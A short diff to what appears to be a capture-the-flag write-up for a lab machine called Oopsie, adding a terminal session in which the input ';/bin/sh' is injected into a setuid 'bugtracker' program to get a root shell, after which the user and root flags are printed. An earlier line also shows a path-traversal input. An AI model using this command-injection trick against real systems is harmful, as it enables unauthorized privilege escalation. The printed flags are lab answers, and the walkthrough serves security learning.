@@ -17,5 +17,29 @@ Provide Bug ID: ../root.txt
 
 af13b0bee69f8a877c3faf667f7beacf
 
-robert@oopsie:~$ 
+# Or
+
+robert@oopsie:~$ /usr/bin/bugtracker 
+
+------------------
+: EV Bug Tracker :
+------------------
+
+Provide Bug ID: ;/bin/sh
+---------------
+
+cat: /root/reports/: Is a directory
+# whoami
+root
+# cat user.txt
+f2c74ee8db7983851ab2a96a44eb7981
+# cd root
+/bin/sh: 5: cd: can't cd to root
+# pwd
+/home/robert
+# cd  /root
+# ls
+reports  root.txt
+# cat root.txt
+af13b0bee69f8a877c3faf667f7beacf
 
